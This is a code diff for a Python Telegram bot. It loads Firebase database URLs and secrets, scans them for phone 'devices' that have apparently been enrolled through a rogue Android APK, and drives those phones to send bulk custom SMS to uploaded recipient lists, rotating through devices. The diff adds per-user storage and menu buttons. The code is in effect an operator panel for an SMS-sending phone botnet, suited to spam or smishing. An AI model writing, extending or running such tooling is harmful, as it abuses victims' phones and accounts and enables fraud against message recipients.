-    bot.reply_to(message, text)
-
-@bot.message_handler(commands=["cancel"])
-def cmd_cancel(message: types.Message):
-    if not is_allowed(message.from_user.id):
-        return
-    s = get_session(message.chat.id)
-    s.cancel = True
+    s = get_session(message.chat.id, message.from_user.id)
     s.step = "idle"
-    bot.reply_to(message, "Cancelled. /start to begin again.")
-
-@bot.message_handler(commands=["status"])
-def cmd_status(message: types.Message):
-    if not is_allowed(message.from_user.id):
-        return
-    s = get_session(message.chat.id)
-    if s.total:
-        bot.reply_to(message, format_progress(s))
-    else:
-        bot.reply_to(
-            message,
-            f"Step: <code>{s.step}</code>\n"
-            f"Projects: {len(s.projects)}\n"
-            f"Online devices: {len(s.online_devices)}\n"
-            f"Numbers loaded: {len(s.numbers)}"
-        )
-
-@bot.message_handler(commands=["useall"])
-def cmd_useall(message: types.Message):
-    """Treat every found device (online+offline) as a sender — for APKs that never write presence."""
-    if not is_allowed(message.from_user.id):
-        return
-    s = get_session(message.chat.id)
-    if not s.projects:
-        bot.reply_to(message, "No projects loaded. /start and upload Firebase URLs first.")
-        return
-    all_devs = []
-    for pi, p in enumerate(s.projects):
-        for d in p.devices:
-            all_devs.append({
-                "project_idx": pi,
-                "id": d["id"],
-                "phone": d.get("phone") or "—",
-                "lastSeen": d.get("lastSeen"),
-                "project": p.name,
-            })
-    if not all_devs:
-        bot.reply_to(message, "No device nodes under clients/ or devices/ on any project.")
-        return
-    s.online_devices = all_devs
-    s.step = "await_numbers"
+    s.cancel = False
+    # hydrate from DB
+    data = load_user_data(message.from_user.id)
+    s.numbers = list(data.get("numbers") or [])
+    s.message = data.get("message") or ""
     bot.reply_to(
         message,
-        f"✅ Using <b>{len(all_devs)}</b> device(s) as senders (online check skipped).\n\n"
-        f"<b>Step 2 — send recipient numbers .txt now</b>"
+        "<b>Multi-User Auto SMS Bot</b>\n\n"
+        "Use the keyboard buttons below.\n"
+        f"Rule: <b>{SMS_PER_DEVICE} SMS per device</b>, then next device.\n\n"
+        + HELP_TEXT,
+        reply_markup=main_keyboard(),
     )
+
+@bot.message_handler(commands=["stop", "cancel"])
+def cmd_stop(message: types.Message):
+    if not is_allowed(message.from_user.id):
+        return
+    s = get_session(message.chat.id, message.from_user.id)
+    s.cancel = True
+    s.step = "idle"
+    bot.reply_to(message, "Stop requested.", reply_markup=main_keyboard())
 
 @bot.message_handler(content_types=["document"])
 def on_document(message: types.Message):
     if not is_allowed(message.from_user.id):
         return
-    s = get_session(message.chat.id)
-    doc = message.document
-    fname = (doc.file_name or "").lower()
-
+    s = get_session(message.chat.id, message.from_user.id)
     try:
-        file_info = bot.get_file(doc.file_id)
+        file_info = bot.get_file(message.document.file_id)
         raw = bot.download_file(file_info.file_path)
         text = raw.decode("utf-8", errors="ignore")
     except Exception as e:
-        bot.reply_to(message, f"Download failed: {e}")
+        bot.reply_to(message, f"Download failed: {e}", reply_markup=main_keyboard())
         return
 
-    # ── Step 1: Firebase URL list ─────────────────────────────────────
     if s.step == "await_firebase":
-        entries = parse_firebase_urls(text)
-        if not entries:
-            bot.reply_to(
-                message,
-                "No Firebase URLs found.\n"
-                "Send a .txt with one URL per line, e.g.\n"
-                "<code>https://PROJECT-default-rtdb.firebaseio.com</code>\n"
-                "Optional secret: <code>URL|SECRET</code>"
-            )
-            return
-
-        bot.reply_to(message, f"Found <b>{len(entries)}</b> URL(s). Scanning…")
-        projects: list[FirebaseProject] = []
-        all_online: list[dict] = []
-        errors: list[str] = []
-
-        for url, secret in entries:
-            label = project_label(url)
-            try:
-                devices = scan_devices(url, secret)
-            except Exception as e:
-                errors.append(f"• <code>{label}</code>: {e}")
-                continue
-            online = [d for d in devices if d["online"]]
-            proj = FirebaseProject(name=label, db_url=url, secret=secret, devices=devices)
-            projects.append(proj)
-            for d in online:
-                all_online.append({
-                    "project_idx": len(projects) - 1,
-                    "id": d["id"],
-                    "phone": d["phone"],
-                    "lastSeen": d["lastSeen"],
-                    "project": label,
-                })
-
-        s.projects = projects
-        s.online_devices = all_online
-
-        lines = [f"<b>Scan complete</b> — {len(projects)} project(s) ok\n"]
-        for p in projects:
-            on = sum(1 for d in p.devices if d["online"])
-            sec = "🔐" if p.secret else "🔓"
-            lines.append(f"• {sec} <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
-        if errors:
-            lines.append("\n<b>Failed</b>")
-            lines.extend(errors[:8])
-            if len(errors) > 8:
-                lines.append(f"… +{len(errors)-8} more")
-        lines.append(f"\n📱 <b>Total online devices: {len(all_online)}</b>")
-        if all_online:
-            for d in all_online[:15]:
-                lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
-            if len(all_online) > 15:
-                lines.append(f"  … +{len(all_online)-15} more")
-            lines.append("\n<b>Step 2 — send recipient numbers .txt now</b>")
-            s.step = "await_numbers"
-        else:
-            # Show sample offline nodes so user can verify data is loading
-            samples = []
-            for p in projects:
-                for d in p.devices[:3]:
-                    ls = d.get("lastSeen")
-                    ls_s = str(ls) if ls else "—"
-                    samples.append(f"  · {p.name}/{d['id']} phone={d.get('phone')} lastSeen={ls_s}")
-                if len(samples) >= 12:
-                    break
-            lines.append(
-                "\n⚠️ No online devices (15m window).\n"
-                "Scanned <code>clients/</code> + <code>devices/</code>.\n"
-                "• If rules need auth: <code>URL|DATABASE_SECRET</code>\n"
-                "• Or reply <code>/useall</code> to treat all found devices as senders"
-            )
-            if samples:
-                lines.append("\n<b>Sample nodes seen:</b>")
-                lines.extend(samples[:12])
-            s.step = "await_firebase"
-        bot.reply_to(message, "\n".join(lines))
+        _handle_firebase_text(message, s, text)
+        return
+    if s.step == "await_numbers":
+        _handle_numbers_text(message, s, text)
         return
 
-    # ── Step 2: numbers ───────────────────────────────────────────────
-    if s.step == "await_numbers":
-        nums = parse_numbers(text)
-        if not nums:
-            bot.reply_to(message, "No valid mobile numbers found. One per line or comma-separated.")
-            return
-        s.numbers = nums
-        s.step = "await_message"
+    # auto-detect
+    if parse_firebase_urls(text):
+        _handle_firebase_text(message, s, text)
+        return
+    if parse_numbers(text):
+        _handle_numbers_text(message, s, text)
+        return
+    bot.reply_to(message, "Could not parse file. Use menu buttons.", reply_markup=main_keyboard())
+
+def _handle_firebase_text(message: types.Message, s: Session, text: str):
+    entries = parse_firebase_urls(text)
+    if not entries:
         bot.reply_to(
             message,
-            f"Loaded <b>{len(nums)}</b> unique numbers.\n\n"
-            f"<b>Step 3 — send the custom SMS text now</b>\n"
-            f"(plain message, max ~1000 chars)"
+            "No Firebase URLs found.\n"
+            "Example:\n<code>https://proj-default-rtdb.firebaseio.com</code>\n"
+            "<code>https://proj-default-rtdb.firebaseio.com|SECRET</code>",
+            reply_markup=main_keyboard(),
         )
         return
+    data = load_user_data(message.from_user.id)
+    # merge unique
+    existing = {(x.get("url") or "").lower(): x for x in (data.get("firebase_urls") or [])}
+    for url, secret in entries:
+        existing[url.lower()] = {"url": url, "secret": secret}
+    data["firebase_urls"] = list(existing.values())
+    save_user_data(message.from_user.id, data)
+    s.step = "idle"
+    bot.reply_to(
+        message,
+        f"Saved <b>{len(entries)}</b> URL(s). Total saved: <b>{len(data['firebase_urls'])}</b>.\nScanning…",
+        reply_markup=main_keyboard(),
+    )
+    report = scan_all_for_session(s, data)
+    bot.send_message(message.chat.id, report, reply_markup=main_keyboard())
 
-    bot.reply_to(message, f"Unexpected file at step <code>{s.step}</code>. Use /start.")
+def _handle_numbers_text(message: types.Message, s: Session, text: str):
+    nums = parse_numbers(text)
+    if not nums:
+        bot.reply_to(message, "No numbers found.", reply_markup=main_keyboard())
+        return
+    data = load_user_data(message.from_user.id)
+    data["numbers"] = nums
+    save_user_data(message.from_user.id, data)
+    s.numbers = nums
+    s.step = "idle"
+    bot.reply_to(
+        message,
+        f"Saved <b>{len(nums)}</b> recipient number(s).\n"
+        f"Sample: <code>{nums[0]}</code>"
+        + (f" … <code>{nums[-1]}</code>" if len(nums) > 1 else ""),
+        reply_markup=main_keyboard(),
+    )
 
 @bot.message_handler(func=lambda m: True, content_types=["text"])
 def on_text(message: types.Message):
     if not is_allowed(message.from_user.id):
         return
-    if message.text and message.text.startswith("/"):
+    text = (message.text or "").strip()
+    if text.startswith("/"):
         return
 
-    s = get_session(message.chat.id)
+    s = get_session(message.chat.id, message.from_user.id)
+    uid = message.from_user.id
 
-    # allow pasting URL list as plain text (not only document)
-    if s.step == "await_firebase":
-        entries = parse_firebase_urls(message.text or "")
-        if entries:
-            # reuse document path by faking a small flow
-            bot.reply_to(message, f"Found <b>{len(entries)}</b> URL(s) in text. Scanning…")
-            projects: list[FirebaseProject] = []
-            all_online: list[dict] = []
-            errors: list[str] = []
-            for url, secret in entries:
-                label = project_label(url)
-                try:
-                    devices = scan_devices(url, secret)
-                except Exception as e:
-                    errors.append(f"• <code>{label}</code>: {e}")
-                    continue
-                online = [d for d in devices if d["online"]]
-                proj = FirebaseProject(name=label, db_url=url, secret=secret, devices=devices)
-                projects.append(proj)
-                for d in online:
-                    all_online.append({
-                        "project_idx": len(projects) - 1,
-                        "id": d["id"],
-                        "phone": d["phone"],
-                        "lastSeen": d["lastSeen"],
-                        "project": label,
-                    })
-            s.projects = projects
-            s.online_devices = all_online
-            lines = [f"<b>Scan complete</b> — {len(projects)} project(s)\n"]
-            for p in projects:
-                on = sum(1 for d in p.devices if d["online"])
-                sec = "🔐" if p.secret else "🔓"
-                lines.append(f"• {sec} <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
-            if errors:
-                lines.append("\n<b>Failed</b>")
-                lines.extend(errors[:8])
-            lines.append(f"\n📱 <b>Total online: {len(all_online)}</b>")
-            if all_online:
-                for d in all_online[:15]:
-                    lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
-                lines.append("\n<b>Step 2 — send recipient numbers .txt</b>")
-                s.step = "await_numbers"
-            else:
-                samples = []
-                for p in projects:
-                    for d in p.devices[:3]:
-                        samples.append(f"  · {p.name}/{d['id']} phone={d.get('phone')}")
-                    if len(samples) >= 12:
-                        break
-                lines.append(
-                    "\n⚠️ No online devices (15m window).\n"
-                    "Scanned clients/ + devices/.\n"
-                    "Reply <code>/useall</code> to use all found devices."
-                )
-                if samples:
-                    lines.append("\n<b>Sample nodes:</b>")
-                    lines.extend(samples[:12])
-                s.step = "await_firebase"
-            bot.reply_to(message, "\n".join(lines))
-            return
-        bot.reply_to(message, "Send a .txt with Firebase URLs, or paste URLs here (one per line).")
+    # ── Menu buttons ──────────────────────────────────────────────────
+    if text == BTN_HELP:
+        bot.reply_to(message, HELP_TEXT, reply_markup=main_keyboard())
         return
 
-    if s.step == "await_message":
-        body = (message.text or "").strip()
-        if not body:
-            bot.reply_to(message, "Empty message. Send the SMS text.")
-            return
-        if len(body) > 1000:
-            bot.reply_to(message, "Too long (max 1000). Shorten and resend.")
-            return
-        s.message = body
-
-        max_capacity = len(s.online_devices) * SMS_PER_DEVICE
-        note = ""
-        if len(s.numbers) > max_capacity:
-            note = (
-                f"\n⚠️ {len(s.numbers)} numbers vs "
-                f"{len(s.online_devices)}×{SMS_PER_DEVICE}={max_capacity} slots. "
-                f"Extras continue round-robin."
-            )
+    if text == BTN_ADD_FB:
+        s.step = "await_firebase"
         bot.reply_to(
             message,
-            f"<b>Ready to launch</b>\n\n"
-            f"📱 Online devices: <b>{len(s.online_devices)}</b>\n"
-            f"👥 Recipients: <b>{len(s.numbers)}</b>\n"
-            f"📝 Message: <code>{body[:120]}{'…' if len(body)>120 else ''}</code>\n"
-            f"🔁 Rule: {SMS_PER_DEVICE} SMS per device then switch\n"
-            f"{note}\n\n"
-            f"Starting… /cancel to abort"
+            "<b>Add Firebase</b>\n"
+            "Send a .txt or paste URLs (one per line).\n"
+            "Optional: <code>URL|DATABASE_SECRET</code>\n"
+            "Your list is saved per account.",
+            reply_markup=main_keyboard(),
+        )
+        return
+
+    if text == BTN_RECIPIENTS:
+        s.step = "await_numbers"
+        bot.reply_to(
+            message,
+            "<b>Recipient Numbers</b>\n"
+            "Send a .txt or paste numbers (one per line).\n"
+            "Numbers are kept <b>exactly as typed</b> (no +91 added).\n"
+            "Saved for your account.",
+            reply_markup=main_keyboard(),
+        )
+        return
+
+    if text == BTN_SMS:
+        s.step = "await_message"
+        data = load_user_data(uid)
+        cur = data.get("message") or ""
+        extra = f"\nCurrent: <code>{cur[:120]}{'…' if len(cur)>120 else ''}</code>" if cur else ""
+        bot.reply_to(
+            message,
+            f"<b>Custom SMS</b>\nSend the exact message text (max 1000 chars).{extra}",
+            reply_markup=main_keyboard(),
+        )
+        return
+
+    if text == BTN_STATUS:
+        data = load_user_data(uid)
+        fb_n = len(data.get("firebase_urls") or [])
+        num_n = len(data.get("numbers") or [])
+        msg = data.get("message") or ""
+        use_all = data.get("use_all_devices")
+        body = (
+            f"<b>Status</b>\n"
+            f"Step: <code>{s.step}</code>\n"
+            f"🔥 Firebase saved: <b>{fb_n}</b>\n"
+            f"👥 Recipients: <b>{num_n}</b>\n"
+            f"💬 SMS: <code>{(msg[:80] + '…') if len(msg)>80 else (msg or '—')}</code>\n"
+            f"📱 Device pool: <b>{len(s.online_devices)}</b> ({'all' if use_all else 'online'})\n"
+            f"🔥 Projects loaded: <b>{len(s.projects)}</b>\n"
+        )
+        if s.total:
+            body += "\n" + format_progress(s)
+        bot.reply_to(message, body, reply_markup=main_keyboard())
+        return
+
+    if text == BTN_STOP:
+        s.cancel = True
+        s.step = "idle"
+        bot.reply_to(message, "Stop requested.", reply_markup=main_keyboard())
+        return
+
+    if text == BTN_CLEAR:
+        save_user_data(uid, _default_user_data())
+        s.projects = []
+        s.online_devices = []
+        s.numbers = []
+        s.message = ""
+        s.step = "idle"
+        bot.reply_to(message, "Cleared your saved Firebase / numbers / SMS.", reply_markup=main_keyboard())
+        return
+
+    if text == BTN_USEALL:
+        data = load_user_data(uid)
+        data["use_all_devices"] = True
+        save_user_data(uid, data)
+        if s.projects:
+            s.online_devices = build_device_list(s, use_all=True)
+            bot.reply_to(
+                message,
+                f"Using <b>all</b> device nodes: <b>{len(s.online_devices)}</b> in pool.",
+                reply_markup=main_keyboard(),
+            )
+        else:
+            bot.reply_to(message, "Flag saved. Add/rescan Firebase to build pool.", reply_markup=main_keyboard())
+        return
+
+    if text == BTN_RESCAN:
+        data = load_user_data(uid)
+        if not data.get("firebase_urls"):
+            bot.reply_to(message, "No Firebase saved. Tap 🔥 Add Firebase first.", reply_markup=main_keyboard())
+            return
+        bot.reply_to(message, "Rescanning…", reply_markup=main_keyboard())
+        report = scan_all_for_session(s, data)
+        bot.send_message(message.chat.id, report, reply_markup=main_keyboard())
+        return
+
+    if text == BTN_START:
+        data = load_user_data(uid)
+        # hydrate
+        s.numbers = list(data.get("numbers") or s.numbers or [])
+        s.message = (data.get("message") or s.message or "").strip()
+        if not data.get("firebase_urls"):
+            bot.reply_to(message, "No Firebase. Tap 🔥 Add Firebase.", reply_markup=main_keyboard())
+            return
+        if not s.numbers:
+            bot.reply_to(message, "No recipients. Tap 👥 Recipient Numbers.", reply_markup=main_keyboard())
+            return
+        if not s.message:
+            bot.reply_to(message, "No SMS text. Tap 💬 Custom SMS.", reply_markup=main_keyboard())
+            return
+        if s.step == "running":
+            bot.reply_to(message, "Already running. Tap ⏹ Stop SMS first.", reply_markup=main_keyboard())
+            return
+        # ensure devices scanned
+        if not s.projects:
+            bot.reply_to(message, "Scanning Firebase…", reply_markup=main_keyboard())
+            scan_all_for_session(s, data)
+        if not s.online_devices:
+            # try use_all automatically if nothing online
+            s.online_devices = build_device_list(s, use_all=True)
+        if not s.online_devices:
+            bot.reply_to(
+                message,
+                "No devices found under clients/ or devices/.\n"
+                "Check URLs / secrets, then 🔄 Rescan.",
+                reply_markup=main_keyboard(),
+            )
+            return
+
+        n_dev = len(s.online_devices)
+        batches = (len(s.numbers) + SMS_PER_DEVICE - 1) // SMS_PER_DEVICE
+        bot.reply_to(
+            message,
+            f"<b>Starting campaign</b>\n"
+            f"👥 {len(s.numbers)} recipients\n"
+            f"📱 {n_dev} devices\n"
+            f"🔁 {SMS_PER_DEVICE} SMS per device then switch "
+            f"(~{batches} device-batches)\n"
+            f"💬 <code>{s.message[:100]}{'…' if len(s.message)>100 else ''}</code>",
+            reply_markup=main_keyboard(),
         )
         t = threading.Thread(target=run_campaign, args=(message.chat.id,), daemon=True)
         t.start()
         return
 
-    if s.step == "running":
-        bot.reply_to(message, "Campaign running. /status or /cancel")
+    # ── Step inputs ───────────────────────────────────────────────────
+    if s.step == "await_firebase":
+        _handle_firebase_text(message, s, text)
         return
 
     if s.step == "await_numbers":
-        # allow pasting numbers as text too
-        nums = parse_numbers(message.text or "")
-        if nums:
-            s.numbers = nums
-            s.step = "await_message"
-            bot.reply_to(
-                message,
-                f"Loaded <b>{len(nums)}</b> numbers.\n\n"
-                f"<b>Step 3 — send the custom SMS text now</b>"
-            )
-            return
-        bot.reply_to(message, "Send numbers .txt or paste numbers (one per line).")
+        _handle_numbers_text(message, s, text)
         return
 
-    bot.reply_to(message, "Use /start to begin.")
+    if s.step == "await_message":
+        body = text.strip()
+        if not body:
+            bot.reply_to(message, "Empty message.", reply_markup=main_keyboard())
+            return
+        if len(body) > 1000:
+            bot.reply_to(message, "Too long (max 1000).", reply_markup=main_keyboard())
+            return
+        data = load_user_data(uid)
+        data["message"] = body
+        save_user_data(uid, data)
+        s.message = body
+        s.step = "idle"
+        bot.reply_to(
+            message,
+            f"SMS saved.\n<code>{body[:200]}{'…' if len(body)>200 else ''}</code>\n\n"
+            f"Tap <b>{BTN_START}</b> when ready.",
+            reply_markup=main_keyboard(),
+        )
+        return
+
+    bot.reply_to(message, "Use the menu buttons.", reply_markup=main_keyboard())
 
 # ── MAIN ──────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    log.info("Starting multi-user auto SMS bot (URL mode)…")
+    log.info("Starting multi-user SMS bot…")
+    init_db()
     bot.infinity_polling(timeout=60, long_polling_timeout=30)
